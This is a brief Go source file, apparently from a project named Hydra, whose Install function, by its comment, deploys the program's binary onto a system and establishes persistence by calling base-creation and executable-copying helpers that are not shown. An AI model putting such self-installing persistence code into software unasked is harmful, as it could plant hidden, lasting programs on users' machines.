package install

import (
	"github.com/Raffy27/Hydra/util"
)

//Install attempts to deploy the binary to the system and establish persistence.
func Install() {
	err := CreateBase()
	util.Panicln(err, "Base creation failed")
	err = CopyExecutable()
	util.Panicln(err, "Binary relocation failed")

}
